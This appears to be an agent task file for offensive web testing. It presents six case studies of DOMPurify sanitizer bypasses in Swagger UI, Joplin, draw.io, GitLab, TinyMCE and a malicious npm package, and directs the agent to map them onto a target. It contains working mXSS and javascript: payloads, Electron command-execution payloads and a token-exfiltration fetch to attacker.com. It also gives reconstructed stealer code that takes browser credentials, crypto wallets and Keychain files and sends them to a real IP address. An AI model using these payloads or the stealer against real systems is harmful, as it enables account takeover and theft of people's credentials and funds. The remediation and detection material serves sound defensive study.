# AGENT TASK: Real-World DOMPurify Bypass Case Studies
# PURPOSE: Learn from 6 real incidents to identify similar patterns on your target
# PRIORITY: Study BEFORE testing - these patterns repeat across applications
# CASES: Swagger UI ATO (60+ orgs), Joplin RCE, drawio, GitLab, TinyMCE, Supply Chain
# INPUTS: Target application type, libraries/frameworks used
# OUTPUT: Pattern matches to real incidents, applicable attack chains
# SECTIONS: F7 (Real-World Incident Forensics)
---

## SECTION F7: Real-World Incident Forensics -- Case Studies

### Case Study 1: Swagger UI -- 60+ Organizations Compromised

**Source:** https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers

**Affected versions:** Swagger UI >= 3.14.1, < 3.38.0  
**Root cause:** Bundled outdated DOMPurify (v2.2.2 in Swagger UI v3.37.2)  
**Impact:** XSS to account takeover in 60+ major organizations

**Architecture of the vulnerability:**

Swagger UI renders API documentation from OpenAPI/Swagger specification files. The rendering pipeline processes Markdown content through multiple transformations:

```
Swagger UI Rendering Pipeline:
==============================

1. OpenAPI Spec (YAML/JSON)
   ├── Contains "description" fields with Markdown
   └── description: "# API Docs\n<details><summary>Click</summary>XSS here</details>"

2. Markdown Parser (Remarkable with html: true)
   ├── Remarkable configured with html: true
   ├── Passes HTML tags THROUGH untouched
   └── Output: HTML string with embedded raw HTML

3. DOMPurify.sanitize(html)
   ├── Swagger UI 3.37.2 bundled DOMPurify 2.2.2
   ├── Custom config: FORBID_TAGS: ['style']
   └── Known bypass existed for DOMPurify 2.2.3

4. React dangerouslySetInnerHTML
   ├── Sanitized HTML inserted into React component
   └── React trusts the string completely
```

**The bypass chain:**

DOMPurify 2.2.3 had a known mXSS bypass using `<style>` elements. Swagger UI's configuration included `FORBID_TAGS: ['style']`, which blocked the original bypass. However, the researcher discovered that substituting `<textarea>` or `<title>` for `<style>` achieved the same mXSS effect:

```html
<!-- Original DOMPurify 2.2.3 bypass (blocked by FORBID_TAGS: ['style']) -->
<form><math><mtext></form><form><mglyph><style></math>
<img src onerror=alert(1)>

<!-- Adapted bypass using <textarea> instead of <style> -->
<form><math><mtext></form><form><mglyph><textarea></math>
<img src onerror=alert(1)>
```

**Why the substitution worked:**

Both `<style>` and `<textarea>` are special parsing elements, but with different rules:
- `<style>` is a rawtext element (content parsed as raw text)
- `<textarea>` is an RCDATA element (content parsed as RCDATA)

In the context of the mXSS attack, both elements created the same namespace confusion. The `<mglyph>` element inside `<math>` triggers a transition, and the special parsing element (`<style>` or `<textarea>`) causes the parser to enter a state where the closing `</math>` tag is consumed as text content rather than closing the MathML context. When the browser reparses the serialized output, the `<img>` breaks out of the math context and becomes a live HTML element.

**Affected organizations (confirmed):**

| Organization | Specific Impact |
|-------------|-----------------|
| PayPal | XSS in API documentation portal |
| Atlassian | XSS across multiple products (Jira, Confluence APIs) |
| Microsoft | XSS in Azure API Management documentation |
| GitLab | XSS in API docs, potential CI/CD pipeline access |
| Yahoo | XSS in multiple API properties |
| Jamf Pro | **Full account takeover** (see below) |

**Jamf Pro escalation to account takeover:**

The Jamf Pro instance was particularly severe because:

```
Jamf Pro Attack Chain:
======================

1. Swagger UI XSS executes JavaScript in Jamf Pro context
   ├── Jamf Pro hosts Swagger UI at /api/doc
   └── XSS runs with Jamf Pro's origin cookies

2. JavaScript accesses localStorage
   ├── Jamf Pro stores authToken in localStorage
   ├── authToken = localStorage.getItem('authToken')
   └── authToken provides full API access

3. Token exfiltration
   ├── fetch('https://attacker.com/steal?token=' + authToken)
   └── Attacker now has valid admin API token

4. Account takeover
   ├── Attacker uses stolen token to access Jamf Pro API
   ├── Can manage all enrolled devices (macOS, iOS)
   ├── Can push profiles, install software
   └── Can remotely wipe/lock devices
```

**Timeline:**
- 2020: DOMPurify 2.2.3 bypass disclosed
- 2021-2022: Swagger UI ships with DOMPurify 2.2.2 (even older)
- 2022: Researchers begin scanning for vulnerable Swagger UI instances
- 2022-2023: 60+ organizations notified
- Swagger UI 3.38.0+: Updated DOMPurify dependency

**Lessons:**
1. **Dependency management is critical:** Swagger UI shipped a DOMPurify version that was already bypassed at the time of Swagger UI's release
2. **FORBID_TAGS is not a substitute for updating:** Blocking `<style>` didn't prevent the bypass because alternative rawtext/RCDATA elements existed
3. **API documentation is attack surface:** Organizations often deprioritize security for API docs, but they run in authenticated contexts
4. **localStorage for tokens enables escalation:** Any XSS in the same origin can steal tokens from localStorage

### Case Study 2: Joplin RCE (CVE-2023-33726)

**Source:** https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/  
**Affected:** Joplin <= 2.11.5 (Electron desktop application)  
**Impact:** Remote Code Execution via crafted note content

**The isomorphic-dompurify problem:**

Joplin used `isomorphic-dompurify`, a wrapper that provides DOMPurify functionality in both browser and Node.js environments. The critical difference:

```
Browser environment:
├── Uses browser's native DOMParser
├── Full HTML5 parsing spec compliance
├── Namespace-aware (SVG, MathML)
└── Matches how content will be rendered

Node.js environment:
├── Uses htmlparser2 as HTML parser
├── htmlparser2 IGNORES NAMESPACES entirely
├── SVG and MathML elements parsed as plain HTML
└── Does NOT match browser rendering behavior
```

**The exploit:**

```html
<!-- Crafted Joplin note content -->
<form><math><mtext></form><form><mglyph><svg><style>
</math><img src onerror="require('child_process').exec('calc')">
```

**Processing differential:**

```
Server-side (Node.js with htmlparser2):
========================================
htmlparser2 parses everything as flat HTML:
├── <form>
├── <math> (treated as unknown HTML element)
├── <mtext> (treated as unknown HTML element)
├── </form> (closes the form)
├── <form> (new form)
├── <mglyph> (unknown element)
├── <svg> (treated as unknown HTML element)
├── <style> (rawtext element)
│   └── text: "</math><img src onerror=...>"
├── </style>
└── (end)

DOMPurify sees: <img> is inside <style> text content ──► SAFE
Sanitized output preserves the structure

Client-side (Electron/Chromium browser):
========================================
Chromium parses with full namespace awareness:
├── <form>
├── <math> ──► enters MathML namespace
│   └── <mtext> ──► HTML integration point
│       ├── </form> ──► closes outer form (foster parenting)
│       ├── <form> ──► new HTML form
│       └── <mglyph> ──► back to MathML namespace
│           └── <svg> ──► enters SVG namespace
│               └── <style> ──► SVG style (NOT rawtext in SVG!)
│                   ──► exits foreign content due to </math>
├── <img src onerror="require('child_process').exec('calc')">
│   ──► TOP-LEVEL HTML ELEMENT, NOT inside <style>
│   ──► EVENT HANDLER FIRES
└── RCE achieved in Electron context
```

**Electron-specific escalation:**

In a standard browser, `onerror=alert(1)` is limited to the browser sandbox. In Electron (Joplin's runtime), Node.js integration may be enabled for the renderer process:

```javascript
// If nodeIntegration is true (or contextIsolation is false):
onerror="require('child_process').exec('id > /tmp/pwned')"

// Even without nodeIntegration, preload scripts may expose APIs:
onerror="window.electronAPI.executeCommand('calc')"
```

**Fix:** Joplin switched to using the browser's native DOMParser for sanitization (even in the Electron main process) to ensure parsing behavior matches rendering behavior.

### Case Study 3: drawio Hook Bypass

**Discovered by:** Mizu  
**Affected:** draw.io (diagrams.net) with custom DOMPurify hooks

draw.io implemented custom DOMPurify hooks to allow certain SVG-specific attributes that DOMPurify would otherwise remove:

```javascript
// draw.io's custom hook (vulnerable version):
DOMPurify.addHook('uponSanitizeAttribute', function(node, data) {
  if (node.tagName === 'svg' || node.closest('svg')) {
    // Allow SVG-specific attributes
    if (data.attrName === 'content' || 
        data.attrName === 'xlink:href') {
      data.forceKeepAttr = true;  // DANGEROUS
    }
  }
});
```

**The bypass:**

The `forceKeepAttr = true` flag tells DOMPurify to keep the attribute regardless of its value. This bypassed DOMPurify's built-in value checking, including the `javascript:` URI check for `xlink:href`:

```html
<svg>
  <a xlink:href="javascript:alert(document.cookie)">
    <text>Click here</text>
  </a>
</svg>
```

Without the hook, DOMPurify would detect `javascript:` in `xlink:href` and remove the attribute. With `forceKeepAttr = true`, the attribute survived sanitization with its dangerous value intact.

**The regex false confidence:**

The draw.io code also had a regex-based secondary check that was supposed to catch dangerous values:

```javascript
// Secondary check (insufficient):
if (data.attrValue.match(/^javascript:/i)) {
  data.forceKeepAttr = false;
}
```

This was bypassed with whitespace and encoding:

```html
<a xlink:href="&#10;javascript:alert(1)">
<!-- Leading newline entity bypasses ^javascript: regex -->
<!-- Browser still resolves to javascript: URI -->
```

**Lesson:** Custom DOMPurify hooks that use `forceKeepAttr = true` effectively disable DOMPurify's protection for that attribute. Hooks should use allowlisting (checking the value is safe) rather than blocklisting (checking it's not dangerous).

### Case Study 4: GitLab rails-ujs Data Attribute Exploitation

**Issues:** GitLab #213273, #336138  
**Affected:** GitLab instances using rails-ujs with user-generated HTML

**Background:** Ruby on Rails' Unobtrusive JavaScript (rails-ujs) library uses HTML5 `data-*` attributes to declaratively add AJAX behavior to HTML elements. These attributes are processed by JavaScript event handlers that rails-ujs installs on `document`.

**The critical data attributes:**

```html
<!-- rails-ujs interprets these data attributes: -->
<a href="/path"
   data-remote="true"    <!-- Converts click to AJAX request -->
   data-method="get"     <!-- HTTP method for the request -->
   data-type="script"    <!-- Response type: "script" = eval() -->
>Click me</a>

<!-- When clicked, rails-ujs: -->
<!-- 1. Intercepts the click event -->
<!-- 2. Sends AJAX GET to /path -->
<!-- 3. Receives response -->
<!-- 4. data-type="script" ──► eval(response) -->
```

**DOMPurify's role:**

DOMPurify allows `data-*` attributes by default (they are part of the HTML5 specification and are generally safe in isolation). The danger arises from the **application framework interpreting these attributes as behavior instructions**.

**Exploitation in GitLab:**

```html
<!-- Injected via user-generated content (issue description, comment, etc.) -->
<a href="https://attacker.com/payload.js"
   data-remote="true"
   data-method="get"
   data-type="script"
   data-confirm="View attachment?"
>
  Important_Document.pdf
</a>

<!-- Attack flow: -->
<!-- 1. Victim sees "Important_Document.pdf" link in GitLab issue -->
<!-- 2. Clicks link ──► data-confirm shows confirmation dialog -->
<!-- 3. User clicks "OK" (thinks they're downloading a PDF) -->
<!-- 4. rails-ujs sends GET to attacker.com/payload.js -->
<!-- 5. data-type="script" causes eval() of response -->
<!-- 6. Arbitrary JavaScript executes in GitLab context -->
```

**GitLab-specific impact:**

```
JavaScript execution in GitLab context allows:
├── Access to GitLab API with victim's CSRF token
├── Read private repositories
├── Modify code (commit, merge)
├── Access CI/CD variables (may contain secrets)
├── Create admin accounts (if victim is admin)
└── Access Kubernetes cluster credentials (if configured)
```

**Remediation approaches:**

1. **DOMPurify configuration:** `FORBID_ATTR: ['data-remote', 'data-method', 'data-type', 'data-confirm', 'data-disable-with']` -- explicitly block the dangerous rails-ujs attributes
2. **Rails-ujs configuration:** Configure rails-ujs to only process data attributes on elements within trusted containers
3. **CSP:** `script-src` without `'unsafe-eval'` blocks the `eval()` call from `data-type="script"`
4. **GitLab's fix:** They added a DOMPurify hook to strip specific data-* attributes used by rails-ujs

### Case Study 5: TinyMCE data-mce-* Bypass Chain (CVE-2026-47759 through CVE-2026-47762)

**Source:** https://corgea.com/research/tinymce-47759-47762-stored-xss-sanitizer-bypass  
**Affected versions:** TinyMCE < 5.11.1, 6.0.0-6.8.6, 7.0.0-7.9.2, 8.0.0-8.5.0  
**Impact:** Stored XSS via sanitizer bypass, escalating to admin session theft

TinyMCE is one of the most widely deployed rich text editors, used in WordPress, Joomla, and thousands of enterprise applications. This series of four CVEs revealed that TinyMCE's internal attributes created systematic DOMPurify bypasses.

**CVE-2026-47759: data-mce-href / data-mce-src / data-mce-style Override**

TinyMCE stores "original" attribute values in `data-mce-*` attributes to preserve them during editing:

```html
<!-- TinyMCE stores original values in data-mce-* attributes -->
<a href="https://safe.com" data-mce-href="javascript:alert(1)">link</a>
<img src="safe.jpg" data-mce-src="javascript:alert(1)">

<!-- During rendering, TinyMCE code restores data-mce-* values: -->
element.href = element.getAttribute('data-mce-href');
// href is now "javascript:alert(1)"
```

DOMPurify sanitizes `href` and `src` attributes, removing `javascript:` URIs. But `data-mce-href` and `data-mce-src` are `data-*` attributes, which DOMPurify allows by default. TinyMCE's own rendering code then overwrites the sanitized values with the unsanitized `data-mce-*` values.

**CVE-2026-47760: Nested SVG Context Switch**

```html
<svg>
  <foreignObject>
    <div xmlns="http://www.w3.org/1999/xhtml">
      <a data-mce-href="javascript:alert(1)">click</a>
    </div>
  </foreignObject>
</svg>
```

The SVG `<foreignObject>` switches back to HTML namespace, but TinyMCE's SVG handling created a context where the `data-mce-href` restoration happened in the HTML context, bypassing SVG-specific sanitization.

**CVE-2026-47761: Media Plugin data-mce-object / data-mce-p-* Bypass**

TinyMCE's media plugin uses `data-mce-object` to store the original media element type and `data-mce-p-*` attributes to store original parameters:

```html
<!-- TinyMCE media plugin representation -->
<img src="placeholder.png"
     data-mce-object="iframe"
     data-mce-p-src="javascript:alert(1)"
     data-mce-p-allowfullscreen="true"
     class="mce-object"
>

<!-- When rendered, TinyMCE reconstructs: -->
<iframe src="javascript:alert(1)" allowfullscreen="true"></iframe>
```

The media plugin reconstructs the original media element from the `data-mce-*` attributes, completely bypassing DOMPurify's sanitization of the intermediate `<img>` representation.

**CVE-2026-47762: mce:protected Comment Restoration**

TinyMCE uses a special comment format to preserve content that would otherwise be stripped during editing:

```html
<!-- mce:protected base64encodedcontent -->
```

The content inside `mce:protected` comments is base64-encoded and restored verbatim during rendering:

```html
<!-- Stored in editor: -->
<!-- mce:protected PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== -->

<!-- base64 decodes to: <script>alert(1)</script> -->

<!-- During rendering, TinyMCE: -->
<!-- 1. Finds mce:protected comments -->
<!-- 2. Base64 decodes the content -->
<!-- 3. Inserts decoded content into the DOM -->
<!-- Result: <script>alert(1)</script> is injected -->
```

DOMPurify does not inspect HTML comment content (comments are passed through by default unless `FORBID_TAGS: ['comment']` or comment removal is configured). The `mce:protected` mechanism effectively used comments as a storage channel for unsanitized script content.

**Combined exploitation chain:**

```
Exploitation Flow:
==================

1. Low-privilege editor creates content with data-mce-* payloads
   ├── Content passes DOMPurify sanitization (data-* allowed)
   └── Stored in database with malicious data-mce-* attributes

2. Content served to admin user for preview/approval
   ├── TinyMCE initializes on the content
   ├── data-mce-href/src/object restored to active attributes
   └── JavaScript executes in admin's browser context

3. Admin context exploitation
   ├── Session cookie/token stolen
   ├── Admin API accessed
   ├── Privilege escalation completed
   └── Persistent backdoor installed via admin functions

Attack Privilege Flow:
  [Low-priv Editor] ──inject──► [Stored Content] 
                                     │
                                     ▼
                              [Admin Preview]
                                     │
                                     ▼
                              [XSS in Admin Context]
                                     │
                                     ▼
                              [Session Theft / Takeover]
```

**Remediation in TinyMCE 5.11.1+, 6.8.7+, 7.9.3+, 8.5.1+:**
- `data-mce-*` attributes are sanitized before restoration
- `mce:protected` comments are validated against an allowlist
- SVG `<foreignObject>` handling updated to maintain sanitization context
- Media plugin validates reconstructed element attributes against DOMPurify's rules

### Case Study 6: Malicious express-dompurify npm Package (Supply Chain)

**Source:** https://socket.dev/blog/malicious-express-dompurify-npm-package-steals-sensitive-data

**Package:** `express-dompurify` (npm)  
**Type:** Supply chain attack via package name confusion  
**Impact:** Credential theft, crypto wallet exfiltration, keychain data theft

**Critical clarification:** This was NOT a compromise of the legitimate DOMPurify package. The attacker published a separate, malicious package named `express-dompurify` that impersonated an Express.js middleware wrapper for DOMPurify. Developers searching for "express dompurify" middleware could inadvertently install the malicious package.

**Package analysis:**

```
express-dompurify (malicious)
├── package.json
│   ├── name: "express-dompurify"
│   ├── description: "Express middleware for DOMPurify sanitization"
│   ├── keywords: ["express", "dompurify", "sanitize", "xss", "security"]
│   └── postinstall: "node setup.js"  // MALICIOUS
│
├── index.js
│   └── Legitimate-looking Express middleware (functional facade)
│
├── setup.js (executed on npm install)
│   ├── Obfuscated JavaScript
│   ├── Downloads second-stage payload
│   └── Establishes persistence
│
└── Second-stage payload
    ├── UpAppData()
    │   ├── Chrome: Login Data, Cookies, Local State
    │   ├── Firefox: logins.json, cookies.sqlite, key4.db
    │   ├── Brave: equivalent files
    │   └── Edge: equivalent files
    │
    ├── UpCryptoAppWalletData()
    │   ├── MetaMask browser extension data
    │   ├── Exodus wallet data
    │   ├── Electrum wallet files
    │   ├── Atomic Wallet data
    │   └── Other cryptocurrency wallet configurations
    │
    ├── UpKeyChain()
    │   ├── macOS Keychain: ~/Library/Keychains/
    │   ├── Exports keychain items via security CLI
    │   └── Targets login keychain (passwords, certificates)
    │
    └── Exfiltration
        ├── POST to http://95.216.251.178:8001/uploads
        ├── Data compressed and base64 encoded
        └── No encryption (HTTP, not HTTPS)
```

**Deobfuscated exfiltration code (reconstructed):**

```javascript
// Browser credential theft (Chrome example):
async function UpAppData() {
  const chromePaths = [
    path.join(os.homedir(), 'Library/Application Support/Google/Chrome'),
    path.join(os.homedir(), '.config/google-chrome'),
    path.join(os.homedir(), 'AppData/Local/Google/Chrome/User Data'),
  ];
  
  for (const chromePath of chromePaths) {
    if (fs.existsSync(chromePath)) {
      const files = [
        'Default/Login Data',      // Saved passwords (SQLite, encrypted)
        'Default/Cookies',         // Session cookies (SQLite, encrypted)
        'Local State',             // Encryption key for above files
        'Default/History',         // Browsing history
        'Default/Web Data',        // Autofill data
      ];
      
      for (const file of files) {
        const fullPath = path.join(chromePath, file);
        if (fs.existsSync(fullPath)) {
          const data = fs.readFileSync(fullPath);
          await exfiltrate(data, `chrome/${file}`);
        }
      }
    }
  }
}

// Crypto wallet theft:
async function UpCryptoAppWalletData() {
  const walletPaths = {
    'metamask': path.join(os.homedir(), 
      'Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'),
    'exodus': path.join(os.homedir(), 
      'Library/Application Support/Exodus'),
    'electrum': path.join(os.homedir(), 
      '.electrum/wallets'),
  };
  
  for (const [name, walletPath] of Object.entries(walletPaths)) {
    if (fs.existsSync(walletPath)) {
      // Recursively read and exfiltrate all wallet files
      await exfiltrateDirectory(walletPath, `wallets/${name}`);
    }
  }
}

// macOS Keychain theft:
async function UpKeyChain() {
  const keychainPath = path.join(os.homedir(), 'Library/Keychains');
  if (fs.existsSync(keychainPath)) {
    // Copy keychain database files
    const files = fs.readdirSync(keychainPath);
    for (const file of files) {
      if (file.endsWith('.keychain-db') || file === 'login.keychain') {
        const data = fs.readFileSync(path.join(keychainPath, file));
        await exfiltrate(data, `keychain/${file}`);
      }
    }
  }
}

// Exfiltration:
async function exfiltrate(data, label) {
  const compressed = zlib.gzipSync(data);
  const encoded = compressed.toString('base64');
  
  await fetch('http://95.216.251.178:8001/uploads', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      label: label,
      hostname: os.hostname(),
      username: os.userInfo().username,
      platform: os.platform(),
      data: encoded,
    }),
  });
}
```

**Detection indicators:**

```
Network IoC:
├── HTTP POST to 95.216.251.178:8001/uploads
├── Large base64-encoded payloads in request body
└── Outbound connections from Node.js process during npm install

File System IoC:
├── setup.js in node_modules/express-dompurify/
├── Unexpected file reads in browser profile directories
├── Unexpected file reads in cryptocurrency wallet directories
└── Unexpected file reads in macOS Keychain directory

Process IoC:
├── Node.js process spawned by npm install reading browser data
├── Child processes accessing security/keychain CLI tools
└── Network connections during postinstall script execution
```

**Broader supply chain lessons:**

1. **Name confusion is a proven attack vector:** `express-dompurify` looks like a legitimate Express middleware name. npm's flat namespace makes these attacks easy.

2. **postinstall scripts are dangerous:** The `postinstall` lifecycle hook executes arbitrary code during `npm install`, before the developer has reviewed the package. `npm install --ignore-scripts` prevents this but is rarely used.

3. **Security package impersonation is particularly insidious:** Developers searching for security-related packages (sanitizers, validators, encryption) are specifically security-conscious -- and thus more likely to install a package that promises to solve a security problem.

4. **Verification steps:**
   - Always verify the package author matches the official project
   - Check the package's npm page for download counts, creation date, and linked repository
   - Use `npm audit` and tools like Socket.dev to detect malicious packages
   - Pin dependencies to exact versions and use lockfiles
   - Consider `npm install --ignore-scripts` for initial installation, then review scripts before running them

---
